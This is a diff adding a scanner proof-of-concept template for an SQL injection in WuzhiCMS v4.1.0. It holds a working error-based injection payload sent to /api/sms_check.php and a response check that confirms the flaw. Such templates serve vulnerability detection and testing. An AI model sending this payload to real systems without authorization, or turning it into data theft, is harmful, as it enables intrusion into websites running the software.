@@ -1,0 +1,14 @@
+name: poc-yaml-wuzhicms-v410-sqli
+rules:
+  - method: GET
+    path: >-
+      /api/sms_check.php?param=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20MD5(1234)),0x7e),1)--%20
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(b"81dc9bdb52d04dc20036dbd8313ed05") && response.body.bcontains(b"sql_error:MySQL Query Error")
+detail:
+  author: leezp
+  Affected Version: "wuzhicms-v4.1.0"
+  vuln_url: "/api/sms_check.php"
+  links:
+    - https://github.com/wuzhicms/wuzhicms/issues/184
